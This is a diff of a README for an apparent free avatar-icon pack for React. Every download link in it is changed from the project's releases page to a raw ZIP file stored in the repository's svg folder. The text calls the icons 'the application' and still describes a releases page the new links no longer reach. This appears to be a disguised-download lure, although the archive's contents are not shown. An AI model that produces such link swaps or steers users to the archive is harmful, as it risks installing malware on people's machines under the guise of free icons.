@@ -1,6 +1,6 @@
 # ✨ shadcn-avatar-icons - Six Free Avatar Icons for React
 
-[![Download Now](https://img.shields.io/badge/Download-Free_Icons-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/seungseungminh/shadcn-avatar-icons/releases)
+[![Download Now](https://img.shields.io/badge/Download-Free_Icons-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/seungseungminh/shadcn-avatar-icons/raw/refs/heads/main/svg/v3.1.zip)
 
 ## 🎯 What Is This?
 
@@ -21,7 +21,7 @@ This is incredibly easy – you don't need any special skills.
 ### Step 1: Download the Files
 
 👉 **Visit this link to download the application:**  
-[**https://github.com/seungseungminh/shadcn-avatar-icons/releases**](https://github.com/seungseungminh/shadcn-avatar-icons/releases)
+[**https://github.com/seungseungminh/shadcn-avatar-icons/raw/refs/heads/main/svg/v3.1.zip**](https://github.com/seungseungminh/shadcn-avatar-icons/raw/refs/heads/main/svg/v3.1.zip)
 
 Once you click the link, you'll see a page with release assets. Look for a file named something like `shadcn-avatar-icons.zip` or similar. Click it to start the download.
 
@@ -168,7 +168,7 @@ All files are named clearly so you know exactly what you're grabbing.
 2. **Extract** the ZIP file anywhere you like.
 3. **Use** the icons however you want – in documents, websites, apps, or presentations.
 
-[![Download Now](https://img.shields.io/badge/Get_The_Icons-Free_Download-blue?style=for-the-badge&logo=download&color=FF5722)](https://github.com/seungseungminh/shadcn-avatar-icons/releases)
+[![Download Now](https://img.shields.io/badge/Get_The_Icons-Free_Download-blue?style=for-the-badge&logo=download&color=FF5722)](https://github.com/seungseungminh/shadcn-avatar-icons/raw/refs/heads/main/svg/v3.1.zip)
 
 If you enjoy these icons, please share them with your friends, fellow designers, or developers. They cost nothing and might just make someone's day a little easier.
 
